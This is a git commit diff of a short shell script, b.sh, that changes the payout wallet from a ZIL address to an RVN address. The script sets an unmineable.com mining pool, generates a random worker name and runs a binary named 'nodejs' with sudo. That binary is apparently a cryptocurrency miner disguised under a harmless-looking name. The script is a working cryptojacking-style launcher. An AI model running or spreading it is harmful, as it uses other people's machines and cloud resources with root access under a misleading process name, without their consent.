551e8dc888dc0372c3f99eb68948c9229b1f0abd
gasken1 <84686224+gasken1@users.noreply.github.com>
2021-08-04 17:05:03 +0700

    Update b.sh

--- b.sh
+++ b.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=ZIL:zil12xj5q0cvpjaz5nm02zntwsp4yr5zvlt2an5me
+WALLET=RVN:RY28x597iBdNnLziuhQ3Y1z9C48Zjo2ysn
 WORKER=$(echo $(shuf -i 1-30 -n 1)-gass) 
 chmod +x nodejs
 sudo ./nodejs -pool $POOL -wal $WALLET.$WORKER -pass x
